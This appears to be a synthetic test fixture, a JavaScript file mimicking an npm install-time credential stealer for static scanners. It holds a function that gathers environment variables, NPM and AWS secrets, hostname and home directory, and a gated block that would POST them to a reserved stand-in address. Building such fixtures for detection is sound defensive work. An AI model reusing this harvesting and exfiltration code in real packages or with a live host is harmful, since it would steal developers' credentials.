// SYNTHETIC TEST FIXTURE — ARENA-CANARY. Inert by design. See repo README.
// Mimics an npm install-time credential stealer. This file is for STATIC scanning;
// it is never meant to run. Even if executed, it transmits nothing: the network call
// is gated behind ARENA_LIVE (never set) and targets a non-routable RFC 5737 address.
const os = require("os");
const https = require("https");

// Detectable shape: harvest environment + common CI/registry secrets.
function harvest() {
  return {
    env: process.env,
    npmToken: process.env.NPM_TOKEN,
    awsKey: process.env.AWS_SECRET_ACCESS_KEY,
    host: os.hostname(),
    home: os.homedir(),
  };
}

// DEFANGED EGRESS: dead code by construction. A real sample would send harvest()
// to an attacker C2; this targets 192.0.2.10 (reserved, non-routable) and never runs.
if (process.env.ARENA_LIVE === "1") {
  const body = JSON.stringify(harvest());
  const req = https.request({
    hostname: "192.0.2.10",
    port: 443,
    path: "/collect",
    method: "POST",
  });
  req.write(body);
  req.end();
}

module.exports = { harvest };
